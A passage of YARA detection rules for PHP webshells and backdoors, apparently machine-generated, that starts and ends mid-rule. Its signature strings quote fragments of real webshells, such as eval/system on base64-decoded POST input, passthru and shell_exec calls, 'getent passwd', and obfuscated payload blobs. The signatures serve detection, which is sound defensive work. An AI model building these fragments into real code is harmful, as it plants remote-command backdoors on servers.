    condition:
        $trigger
}

rule php_backdoor_webshell_227 : backdoor
{
    strings:
        $trigger = "if(!@ftp_put($ftpconn, $remoteFile, $file, FTP_BINARY)){"
    condition:
        $trigger and PR01403 and PR01415 and PR01479
}

private rule PR03550 : trigger
{
    strings:
        $ps0 = "function strpos( $haystack, $needle, $offset = 0"
    condition:
        $ps0
}

rule php_backdoor_webshell_228 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03550 and PR00355 and PR00357
}

rule php_backdoor_webshell_229 : backdoor
{
    strings:
        $trigger = "CURLOPT_COOKIEJAR,$GLOBALS[base64_decode("
    condition:
        $trigger and PR01398
}

private rule PR03551 : trigger
{
    strings:
        $ps0 = "return (($this->_=md5($header).substr(md5(strrev($"
    condition:
        $ps0
}

private rule PR03552 : trigger
{
    strings:
        $ps0 = "@posix_getuid() : null; return json_encode(array("
    condition:
        $ps0
}

rule php_backdoor_webshell_230 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03551 and PR01468 and PR03552 and PR01534
}

private rule PR03553 : trigger
{
    strings:
        $ps0 = "\"\\145\\166\\141\\154\".'(\"?>"
    condition:
        $ps0
}

private rule PR03554 : trigger
{
    strings:
        $ps0 = "$GLOBALS[\"\\160\\141\\163\\163\"]"
    condition:
        $ps0
}

rule php_backdoor_webshell_231 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR03553 and PR03554
}

rule php_backdoor_webshell_232 : backdoor
{
    strings:
        $trigger = "U2hlbGw6PGJyPjxhIGhyZWY9Imh0dHA"
    condition:
        $trigger and PR01403 and PR01415 and PR01479
}

private rule PR03555 : trigger
{
    strings:
        $ps0 = "KpthyZpg2YU+gpHqXah2GL3kEBLvpZiLtTbDly"
    condition:
        $ps0
}

rule php_backdoor_webshell_233 : backdoor
{
    strings:
        $trigger = "(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR03555
}

rule php_backdoor_webshell_234 : backdoor
{
    strings:
        $trigger = "404 Error Web Shell"
    condition:
        $trigger and PR01421
}

private rule PR03556 : trigger
{
    strings:
        $ps0 = "if(copyfiles($"
    condition:
        $ps0
}

rule php_backdoor_webshell_235 : backdoor
{
    strings:
        $trigger = "curl_init("
    condition:
        $trigger and PR00435 and PR02099 and PR03556
}

private rule PR03557 : trigger
{
    strings:
        $ps0 = ",'');die();"
    condition:
        $ps0
}

rule php_backdoor_webshell_236 : backdoor
{
    strings:
        $trigger = "=\"\\x73\\x74\\x72\\x5f\\x72\\x6f\\x74\".("
    condition:
        $trigger and PR00092 and PR03557
}

private rule PR03558 : trigger
{
    strings:
        $ps0 = "{print shell_exec($"
    condition:
        $ps0
}

private rule PR03559 : trigger
{
    strings:
        $ps0 = "{initiate(); die();}"
    condition:
        $ps0
}

rule php_backdoor_webshell_238 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02617 and PR03558 and PR03559
}

rule php_backdoor_webshell_240 : backdoor
{
    strings:
        $trigger = "7b1pWxu50jD8ebgu/oPSwz1tT4zxwk5MwmKICVtslkDI8bTdjd3Bdvu4bZbM5L+"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR03560 : trigger
{
    strings:
        $ps0 = "tempnam(\"/tmp\", \"0\");"
    condition:
        $ps0
}

rule php_backdoor_webshell_241 : backdoor
{
    strings:
        $trigger = "extract(x($i));"
    condition:
        $trigger and PR00355 and PR03560 and PR00357 and PR01431
}

private rule PR03561 : trigger
{
    strings:
        $ps0 = "str_replace('helloword"
    condition:
        $ps0
}

rule php_backdoor_webshell_243 : backdoor
{
    strings:
        $trigger = "('',@$_POST["
    condition:
        $trigger and PR03561
}

private rule PR03562 : trigger
{
    strings:
        $ps0 = "CiBnb3RvIEVGWjFXOyBiUVVVejogZG"
    condition:
        $ps0
}

rule php_backdoor_webshell_244 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03562 and PR01398
}

private rule PR03563 : trigger
{
    strings:
        $ps0 = ">users}\".base64_decode('"
    condition:
        $ps0
}

rule php_backdoor_webshell_245 : backdoor
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR00050 and PR01092 and PR03563
}

private rule PR03564 : trigger
{
    strings:
        $ps0 = "aGVsbHgub3JnL2hpZGU"
    condition:
        $ps0
}

rule php_backdoor_webshell_246 : backdoor
{
    strings:
        $trigger = ".base64_decode"
    condition:
        $trigger and PR03564
}

rule php_backdoor_webshell_247 : backdoor
{
    strings:
        $trigger = "xTZVhhZndNMDdMeExaYnN2SlgxbW5nTU0zR3NWR3pKVmZ1ZzF5ek1NNndVSXp3VXYwcV"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR03565 : trigger
{
    strings:
        $ps0 = "mRmQsMCwkWFBMTk1Xb1NoVGpSS0lWcUJw"
    condition:
        $ps0
}

rule php_backdoor_webshell_248 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR03565
}

rule php_backdoor_webshell_249 : backdoor
{
    strings:
        $trigger = "pTsLc5tIk3+FKGyAXYQAvW1hJ7VxNlvf5nGOc99VOf5UI0CCMgIOkB+J/N+vu2d4St5HXW1FHmZ6unt6+jkzG64l9YXnr8PY91Ql8zYf8zBWNO2HxDvrPkm3tFM"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_webshell_250 : backdoor
{
    strings:
        $trigger = "7f3ZkttKtigIPktfwdTROQydkBQAh4igtKVMzjMjOIEkUllRIACSIDEFAY559nO9lVW3tVmXWV2zW2b"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03566 : trigger
{
    strings:
        $ps0 = "echo \"<h2>Shell"
    condition:
        $ps0
}

rule php_backdoor_webshell_252 : backdoor
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR01480 and PR01468 and PR03566
}

rule php_backdoor_webshell_253 : backdoor
{
    strings:
        $trigger = "function rantit(text, runs_left, delay, charvar, max){"
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_254 : backdoor
{
    strings:
        $trigger = "<input type=\"text\" name=\"cmd\" id=\"cmd\" value=\"<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>\""
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_255 : backdoor
{
    strings:
        $trigger = "$shell = str_replace( array(\"http://\", \"www.\", \"https://\"), \"\", $shell);"
    condition:
        $trigger and PR00029 and PR01431
}

private rule PR03567 : trigger
{
    strings:
        $ps0 = "<title>exp_door"
    condition:
        $ps0
}

rule php_backdoor_webshell_256 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR01369 and PR03567 and PR01021 and PR02769 and PR02870
}

rule php_backdoor_webshell_257 : backdoor
{
    strings:
        $trigger = "MTAwME0nKTsNCmluaV9zZXQoJ2"
    condition:
        $trigger and PR00435
}

private rule PR03568 : trigger
{
    strings:
        $ps0 = "@header('NikolaT3sla: Shell')"
    condition:
        $ps0
}

rule php_backdoor_webshell_258 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
    condition:
        $trigger and PR03568
}

private rule PR03569 : trigger
{
    strings:
        $ps0 = "@fwrite($handle, $backdoor);"
    condition:
        $ps0
}

rule php_backdoor_webshell_259 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR03569 and PR01415
}

private rule PR03570 : trigger
{
    strings:
        $ps0 = "__halt_compiler();"
    condition:
        $ps0
}

rule php_backdoor_webshell_259_02 : backdoor
{
    strings:
        $trigger = "ZnVuY3Rpb24gcmVzcG9uc2UoJG"
    condition:
        $trigger and PR03570 and PR01414
}

private rule PR03571 : trigger
{
    strings:
        $ps0 = "7X17kxw3kt%2FfM58CHM2qZ1bzJqn"
    condition:
        $ps0
}

rule php_backdoor_webshell_260 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03571
}

private rule PR03572 : trigger
{
    strings:
        $ps0 = "(\"JE8wME9PMDAwPSJDQnpqaHVjUXdIaXZtVldSbkVYeFRQS05JT2xkSkF"
    condition:
        $ps0
}

rule php_backdoor_webshell_261 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR03572 and PR00029
}

private rule PR03573 : trigger
{
    strings:
        $ps0 = "define('SELF_PATH"
    condition:
        $ps0
}

rule php_backdoor_webshell_262 : backdoor
{
    strings:
        $trigger = "7X1rV9tKsuhnzlrnP3Q0nC17xxjbQCYxGMI"
    condition:
        $trigger and PR01436 and PR03573 and PR00029 and PR02667
}

rule php_backdoor_webshell_263 : backdoor
{
    strings:
        $trigger = "7Vltb9s4Ev4eIP+BZX2VjbUtOZ"
    condition:
        $trigger and PR00029 and PR01436
}

private rule PR03574 : trigger
{
    strings:
        $ps0 = "GGxEZe67IRWPjDTgj6HWKgYSPQ"
    condition:
        $ps0
}

rule php_backdoor_webshell_264 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03574
}

private rule PR03575 : trigger
{
    strings:
        $ps0 = "c2V0X3RpbWVfbGltaXQoMCk7DQplcnJvcl9yZXBvcnRpbmcoMCk7DQoN"
    condition:
        $ps0
}

rule php_backdoor_webshell_265 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03575 and PR02951
}

private rule PR03576 : trigger
{
    strings:
        $ps0 = "tP0HWJNLtzAMX3Q4cNF70RACSSBA6AiE3qUXaUMJECAIAUKoooYOCgiICIpKE7GjYG8"
    condition:
        $ps0
}

rule php_backdoor_webshell_266 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03576
}

rule php_backdoor_webshell_267 : backdoor
{
    strings:
        $trigger = ".base64_encode($md5)."
    condition:
        $trigger and PR01543 and PR01403 and PR01415 and PR01479
}

private rule PR03577 : trigger
{
    strings:
        $ps0 = "chr(bindec(str_replace(array(chr("
    condition:
        $ps0
}

private rule PR03578 : trigger
{
    strings:
        $ps0 = ".base64_decode(str_rot13(gzdecode($out))));include"
    condition:
        $ps0
}

rule php_backdoor_webshell_269 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03577 and PR01468 and PR03578
}

rule php_backdoor_webshell_270 : backdoor
{
    strings:
        $trigger = "SkdOdmJtWnBaeUE5SUdGeWNtRjVLQW9nSW5abGNuTnBiMj"
    condition:
        $trigger and PR01398
}

private rule PR03579 : trigger
{
    strings:
        $ps0 = "add_action( 'wp_loaded', array($this,"
    condition:
        $ps0
}

private rule PR03580 : trigger
{
    strings:
        $ps0 = "explode("
    condition:
        $ps0
}

rule php_backdoor_webshell_271 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03579 and PR03580 and PR00431
}

private rule PR03581 : trigger
{
    strings:
        $ps0 = "))); break; case 'chmod': if (empty($"
    condition:
        $ps0
}

rule php_backdoor_webshell_272 : backdoor
{
    strings:
        $trigger = "HTTP/1.0 404 Not Found"
    condition:
        $trigger and PR00431 and PR00341 and PR03581
}

private rule PR03582 : trigger
{
    strings:
        $ps0 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMj"
    condition:
        $ps0
}

rule php_backdoor_webshell_273 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03582
}

private rule PR03583 : trigger
{
    strings:
        $ps0 = "continue;if(${"
    condition:
        $ps0
}

rule php_backdoor_webshell_274 : backdoor
{
    strings:
        $trigger = "write.c>"
    condition:
        $trigger and PR03583 and PR00265 and PR02549
}

private rule PR03584 : trigger
{
    strings:
        $ps0 = "host%"
    condition:
        $ps0
}

rule php_backdoor_webshell_274_02 : backdoor
{
    strings:
        $trigger = "CURLOPT_USERAGENT"
    condition:
        $trigger and PR03583 and PR00265 and PR03584
}

private rule PR03585 : trigger
{
    strings:
        $ps0 = "QGluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTtAaW5pX3Jlc3RvcmUoIm9"
    condition:
        $ps0
}

rule php_backdoor_webshell_275 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03585
}

private rule PR03586 : trigger
{
    strings:
        $ps0 = "\"]();?>"
    condition:
        $ps0
}

rule php_backdoor_webshell_276 : backdoor
{
    strings:
        $trigger = "\"])){echo \\'wp-blog-header\\';}');$"
    condition:
        $trigger and PR00675 and PR03586
}

private rule PR03587 : trigger
{
    strings:
        $ps0 = "function shellExec($cmd)"
    condition:
        $ps0
}

private rule PR03588 : trigger
{
    strings:
        $ps0 = "function phpValInfo()"
    condition:
        $ps0
}

rule php_backdoor_webshell_277 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03587 and PR03588 and PR00355 and PR00357 and PR02033
}

rule php_backdoor_webshell_278 : backdoor
{
    strings:
        $trigger = "$_POST[\"explorer-delete-file-submit\"]"
    condition:
        $trigger and PR00355 and PR00357 and PR02033 and PR01431
}

rule php_backdoor_webshell_279 : backdoor
{
    strings:
        $trigger = "<script>window.location="
    condition:
        $trigger and PR00042 and PR02460
}

// MANUAL FIX NECESSARY
private rule PR03589 : trigger
{
    strings:
        $ps0 = "eval ( base64_decode ( $_POST["
    condition:
        $ps0
}

rule php_backdoor_webshell_280 : backdoor
{
    strings:
        $trigger = "system ( base64_decode ( $_POST["
        $php_backdoor_webshell_280_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR03589 and $php_backdoor_webshell_280_r0
}

private rule PR03590 : trigger
{
    strings:
        $ps0 = "getent passwd"
    condition:
        $ps0
}

rule php_backdoor_webshell_281 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR02448 and PR03590
}

rule php_backdoor_webshell_282 : backdoor
{
    strings:
        $trigger = "if(is_callable('phpinfo')){echo \"\\n\\nPHP INFO:\\n\";ob_start();phpinfo();"
    condition:
        $trigger and PR00029 and PR01422 and PR01788
}

rule php_backdoor_webshell_283 : backdoor
{
    strings:
        $trigger = "Yqvn3uJAjura768A01C8najR86gTe"
    condition:
        $trigger and PR02205
}

private rule PR03591 : trigger
{
    strings:
        $ps0 = "=Nj/8C+2NKkj8LqsNgv4/7xu9yaq/ZsP2D4pK0sIM/69rvv"
    condition:
        $ps0
}

rule php_backdoor_webshell_284 : backdoor
{
    strings:
        $trigger = "strrev("
    condition:
        $trigger and PR00029 and PR03591 and PR01436
}

rule php_backdoor_webshell_285 : backdoor
{
    strings:
        $trigger = "set_token(\"NO_LOGIN\"):(k(),a(window).unload(function(){k()})),p&&s.echo(p),r&&s.echo(r)})}(jQuery);</script>"
    condition:
        $trigger and PR00042
}

private rule PR03592 : trigger
{
    strings:
        $ps0 = "(gzinflate(str_rot13(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_webshell_286 : backdoor
{
    strings:
        $trigger = "MzQyNjE1M7ewNMjLLygsKi4pLSuvqKxXWVdBVlpYz8jMys7JjQcA"
    condition:
        $trigger and PR03592
}

rule php_backdoor_webshell_287 : backdoor
{
    strings:
        $trigger = "a5xYLVjM0UO3t0bXWK8qzVjOzy0oVy0u1lWv"
    condition:
        $trigger and PR01422 and PR01372
}

private rule PR03593 : trigger
{
    strings:
        $ps0 = "PD9waHAKCi8qCiAgICAwIGIgeSB0IDMgbSAxIG4gMSAtIDIuMgo"
    condition:
        $ps0
}

rule php_backdoor_webshell_288 : backdoor
{
    strings:
        $trigger = "fwrite($"
    condition:
        $trigger and PR03593 and PR00203
}

rule php_backdoor_webshell_289 : backdoor
{
    strings:
        $trigger = "aWYobWQ1KCRfQ09PS0lFWydhc2RmJ10pPT0nZjNmODI1NGUyNjgzZGRlM"
    condition:
        $trigger and PR01398
}

rule php_backdoor_webshell_290 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR02617 and PR02767
}

private rule PR03594 : trigger
{
    strings:
        $ps0 = "lVsLc5vIsv4rRGEDJBg9rHgTS"
    condition:
        $ps0
}

rule php_backdoor_webshell_291 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03594
}

private rule PR03595 : trigger
{
    strings:
        $ps0 = "\"]=substr(__FILE__,0,strpos(str_replace(\"\\\\\",\"/\",__FILE__),${${\"\\x47"
    condition:
        $ps0
}

private rule PR03596 : trigger
{
    strings:
        $ps0 = "\"]=\"zip\";${\"\\x"
    condition:
        $ps0
}

rule php_backdoor_webshell_292 : backdoor
{
    strings:
        $trigger = "\"]}){$_SESSION[md5($_SERVER[\"\\x"
    condition:
        $trigger and PR00029 and PR01742 and PR03595 and PR01422 and PR03596
}

private rule PR03597 : trigger
{
    strings:
        $ps0 = "register_shutdown_function"
    condition:
        $ps0
}

rule php_backdoor_webshell_293 : backdoor
{
    strings:
        $trigger = "if(isset($_GET['remove'])) {unlink($"
    condition:
        $trigger and PR01350 and PR03597
}

private rule PR03598 : trigger
{
    strings:
        $ps0 = "=true;break;endif;;endfor;;if($_"
    condition:
        $ps0
}

private rule PR03599 : trigger
{
    strings:
        $ps0 = ")>(int)round(1+1)):return substr($_"
    condition:
        $ps0
}

private rule PR03600 : trigger
{
    strings:
        $ps0 = "=imagecreatetruecolor($_"
    condition:
        $ps0
}

rule php_backdoor_webshell_294 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03598 and PR03599 and PR00357 and PR03600
}

private rule PR03601 : trigger
{
    strings:
        $ps0 = "\\x4B\\x43\\x52\\x77\\x5A\\x58\\x4A\\x74\\x63\\x79\\x41\\x6D\\x49\\x44\\x42\\x34\\x4D\\x44\\x49\\x77\\x4D\\x43\\x6B\\x67"
    condition:
        $ps0
}

rule php_backdoor_webshell_295 : backdoor
{
    strings:
        $trigger = "\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5"
    condition:
        $trigger and PR00029 and PR03601
}

private rule PR03602 : trigger
{
    strings:
        $ps0 = "= shell_exec('mysql -V');"
    condition:
        $ps0
}

rule php_backdoor_webshell_296 : backdoor
{
    strings:
        $trigger = "($_POST["
    condition:
        $trigger and PR01726 and PR00046 and PR03602
}

private rule PR03603 : trigger
{
    strings:
        $ps0 = "}=@fopen(${${base64_decode("
    condition:
        $ps0
}

private rule PR03604 : trigger
{
    strings:
        $ps0 = "${base64_decode('R0xPQkFMUw==')}[base64_decode("
    condition:
        $ps0
}

rule php_backdoor_webshell_297 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03603 and PR03604
}

rule php_backdoor_webshell_298 : backdoor
{
    strings:
        $trigger = "@preg_match_all('/.*?zone \"(.*?)\" {/', $dominios, $out);"
    condition:
        $trigger and PR00042
}

private rule PR03605 : trigger
{
    strings:
        $ps0 = "7f1rexq50iiAfs/z5D90WF4DTGwM+BJfgicYsI3jK"
    condition:
        $ps0
}

rule php_backdoor_webshell_299 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03605 and PR00029
}

private rule PR03606 : trigger
{
    strings:
        $ps0 = "(gzinflate(str_rot13(base64_decode(\"\\"
    condition:
        $ps0
}

rule php_backdoor_webshell_300 : backdoor
{
    strings:
        $trigger = "\\x"
    condition:
        $trigger and PR01421 and PR00029 and PR03606
}

private rule PR03607 : trigger
{
    strings:
        $ps0 = "urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64"
    condition:
        $ps0
}

rule php_backdoor_webshell_301 : backdoor
{
    strings:
        $trigger = "lMhtrLF3kjhbShC29VfolVfBA7tm0hk"
    condition:
        $trigger and PR00029 and PR03607
}

rule php_backdoor_webshell_302 : backdoor
{
    strings:
        $trigger = "SBSg9ghszOqs08zzNd"
    condition:
        $trigger and PR01860 and PR01590
}

private rule PR03608 : trigger
{
    strings:
        $ps0 = "base64_decode('Pi9kZXYvbnVsbCAyPiYxICY="
    condition:
        $ps0
}

rule php_backdoor_webshell_303 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03140 and PR03608 and PR01899
}

private rule PR03609 : trigger
{
    strings:
        $ps0 = "Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWV"
    condition:
        $ps0
}

rule php_backdoor_webshell_305 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03609 and PR01398
}

rule php_backdoor_webshell_306 : backdoor
{
    strings:
        $trigger = "JGkzNmE1YjQwZDFjMDQ1YjMwNmJhZTk5NmUzNTU3"
    condition:
        $trigger and PR01350
}

rule php_backdoor_webshell_307 : backdoor
{
    strings:
        $trigger = "eval(strrev(htmlspecialchars_decode(gzinflate(base64_decode($"
    condition:
        $trigger
}

rule php_backdoor_webshell_308 : backdoor
{
    strings:
        $trigger = "Z2FnYWwgVXBsb2Fk"
    condition:
        $trigger and PR01398
}

private rule PR03610 : trigger
{
    strings:
        $ps0 = "ZnVuY3Rpb24gc2hlbGwoK"
    condition:
        $ps0
}

rule php_backdoor_webshell_309 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03610
}

private rule PR03611 : trigger
{
    strings:
        $ps0 = "7Vlbb9tGFn4PkB8RVhvKW0uUFG3ilSU1jq"
    condition:
        $ps0
}

rule php_backdoor_webshell_310 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03611 and PR01398
}

private rule PR03612 : trigger
{
    strings:
        $ps0 = "7f3ZkuNIsigIPkd8BU+cOIceJxYHuLg7IzLiFPcd7"
    condition:
        $ps0
}

rule php_backdoor_webshell_311 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03612
}

private rule PR03613 : trigger
{
    strings:
        $ps0 = "getcwd().DIRECTORY_SEPARATOR.basename($_SERVER["
    condition:
        $ps0
}

rule php_backdoor_webshell_312 : backdoor
{
    strings:
        $trigger = "if(!function_exists('openssl_decrypt')){die("
    condition:
        $trigger and PR03613 and PR00341 and PR00342
}

private rule PR03614 : trigger
{
    strings:
        $ps0 = "if(is_callable('fsockopen')and!in_array('fsockopen',$"
    condition:
        $ps0
}

rule php_backdoor_webshell_313 : backdoor
{
    strings:
        $trigger = "while(!feof($"
    condition:
        $trigger and PR03614
}

private rule PR03615 : trigger
{
    strings:
        $ps0 = "\\x65\\x76\\x61\\x6c"
    condition:
        $ps0
}

rule php_backdoor_webshell_314 : backdoor
{
    strings:
        $trigger = "function login_shell() {"
    condition:
        $trigger and PR00029 and PR03615
}

private rule PR03616 : trigger
{
    strings:
        $ps0 = "SystemHelper::response('Failed to create dir', 500);"
    condition:
        $ps0
}

rule php_backdoor_webshell_315 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03616 and PR00357
}

rule php_backdoor_webshell_316 : backdoor
{
    strings:
        $trigger = "github.com/eviltwin"
    condition:
        $trigger and PR00029 and PR00634
}

private rule PR03617 : trigger
{
    strings:
        $ps0 = "@passthru($in);"
    condition:
        $ps0
}

private rule PR03618 : trigger
{
    strings:
        $ps0 = "function exe($in)"
    condition:
        $ps0
}

rule php_backdoor_webshell_317 : backdoor
{
    strings:
        $trigger = "(!@feof($"
    condition:
        $trigger and PR03617 and PR03618
}

private rule PR03619 : trigger
{
    strings:
        $ps0 = "$send = move_uploaded_file($_FILES['randsx']['tmp_name'], $PathFile);"
    condition:
        $ps0
}

rule php_backdoor_webshell_318 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR03619 and PR00046
}

private rule PR03620 : trigger
{
    strings:
        $ps0 = "ini_set('display_errors',0);session_start();define('VERSION"
    condition:
        $ps0
}

rule php_backdoor_webshell_319 : backdoor
{
    strings:
        $trigger = "$data,$title_matches);if($res){$title=preg_replace"
    condition:
        $trigger and PR00042 and PR03620 and PR00281
}

private rule PR03621 : trigger
{
    strings:
        $ps0 = "AK-74 Security"
    condition:
        $ps0
}

rule php_backdoor_webshell_320 : backdoor
{
    strings:
        $trigger = "fwrite($"
    condition:
        $trigger and PR03621 and PR00203
}

private rule PR03622 : trigger
{
    strings:
        $ps0 = "\".@readf($"
    condition:
        $ps0
}

rule php_backdoor_webshell_321 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03148 and PR01021 and PR03622 and PR02769
}

private rule PR03623 : trigger
{
    strings:
        $ps0 = "<title>Shell Bypass"
    condition:
        $ps0
}

rule php_backdoor_webshell_322 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR03623 and PR00357
}

private rule PR03624 : trigger
{
    strings:
        $ps0 = "Bind Shell"
    condition:
        $ps0
}

rule php_backdoor_webshell_323 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR03624 and PR00046
}

private rule PR03625 : trigger
{
    strings:
        $ps0 = "preg_match(\"@'DB_NAME"
    condition:
        $ps0
}

private rule PR03626 : trigger
{
    strings:
        $ps0 = "preg_match(\"/--bindir=("
    condition:
        $ps0
}

rule php_backdoor_webshell_324 : backdoor
{
    strings:
        $trigger = "base64_decode($"
    condition:
        $trigger and PR01480 and PR01468 and PR03625 and PR03626
}

rule php_backdoor_webshell_325 : backdoor
{
    strings:
        $trigger = "googlebot\") !== FALSE) || (strpos(strtolower($_SERVER["
    condition:
        $trigger and PR00355 and PR01392 and PR00357 and PR01431
}

// MANUAL FIX NECESSARY
rule php_backdoor_webshell_326 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_webshell_326_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_backdoor_webshell_326_r1 = /\$\w+\s*=\s*\\"\w+\\"\;\s*\$\w+=\$\w+\[\d+\]\s*\.[\s]*\$\w+\[\d+\]\s*\.[^\)]*\);\s*\$\w+\s*=\$\w+\s*\([^;]*\\"\)\)\);\s*\$\w+\(\);/
    condition:
        $trigger and $php_backdoor_webshell_326_r0 and $php_backdoor_webshell_326_r1
}

rule php_backdoor_webshell_327 : backdoor
{
    strings:
        $trigger = "return @rawurldecode(@hex2bin($"
    condition:
        $trigger and PR00046 and PR01468 and PR01330
}

rule php_backdoor_webshell_328 : backdoor
{
    strings:
        $trigger = "\\x63\\x72\\x65\\x61\\x74\\x65\\x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e"
    condition:
        $trigger and PR00203 and PR01403
}

rule php_backdoor_webshell_329 : backdoor
{
    strings:
        $trigger = "7Tp2YtrK2p9bqf9ujkJBDSLBcw8kQw"
    condition:
        $trigger and PR02205
}

private rule PR03627 : trigger
{
    strings:
        $ps0 = "dirname(__FILE__);foreach(scandir($"
    condition:
        $ps0
}

private rule PR03628 : trigger
{
    strings:
        $ps0 = "};if(isset($_REQUEST[$"
    condition:
        $ps0
}

rule php_backdoor_webshell_330 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01571 and PR01468 and PR03627 and PR03628
}

rule php_backdoor_webshell_330_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01571 and PR01468 and PR01585 and PR03628
}

private rule PR03629 : trigger
{
    strings:
        $ps0 = "..'))) array_pop($ret); else $ret[] = $part; $ret = $root.implode('/', $ret); if (!strlen"
    condition:
        $ps0
}

rule php_backdoor_webshell_332 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR01569 and PR03629 and PR01431
}

private rule PR03630 : trigger
{
    strings:
        $ps0 = "MKMuoPtxMzqyK2IvMmRmXPEiozMlAwEspKWjLaSlXPqwoJk1MIAan1ygEacn"
    condition:
        $ps0
}

rule php_backdoor_webshell_334 : backdoor
{
    strings:
        $trigger = "[PHPkoru_Info]"
    condition:
        $trigger and PR03630 and PR01398
}

rule php_backdoor_webshell_335 : backdoor
{
    strings:
        $trigger = "OWRlYYAoatUoI8vNXqKDsO19MjP2p4NJ/174VEF72NetkLOdU/iutHu7Pqgp+PBGA15+pn5u9RTpaf"
    condition:
        $trigger and PR01398
}

private rule PR03631 : trigger
{
    strings:
        $ps0 = "case \"kill\" : unlink(__FILE__);"
    condition:
        $ps0
}

private rule PR03632 : trigger
{
    strings:
        $ps0 = "$writeConnection = $resource->getConnection("
    condition:
        $ps0
}

rule php_backdoor_webshell_336 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR03631 and PR03632
}

private rule PR03633 : trigger
{
    strings:
        $ps0 = "JE9PTzBPTzBPME89ZmlsZShwcmVnX3JlcGxhY2UoIkBc"
    condition:
        $ps0
}

rule php_backdoor_webshell_337 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03633
}

private rule PR03634 : trigger
{
    strings:
        $ps0 = "JE1pbmlTaGVsbCA9ICJTSm5IQ3NPS0ZWSDNnZnhRQ0V5"
    condition:
        $ps0
}

rule php_backdoor_webshell_338 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR03634
}

private rule PR03635 : trigger
{
    strings:
        $ps0 = "function __construct($core)"
    condition:
        $ps0
}

private rule PR03636 : trigger
{
    strings:
        $ps0 = "class mbd_"
    condition:
        $ps0
}

rule php_backdoor_webshell_339 : backdoor
{
    strings:
        $trigger = "$this->core->data->"
    condition:
        $trigger and PR03635 and PR03636
}

private rule PR03637 : trigger
{
    strings:
        $ps0 = "$this->phpv = substr(phpversion(), 0, 3);"
    condition:
        $ps0
}

rule php_backdoor_webshell_339_02 : backdoor
{
    strings:
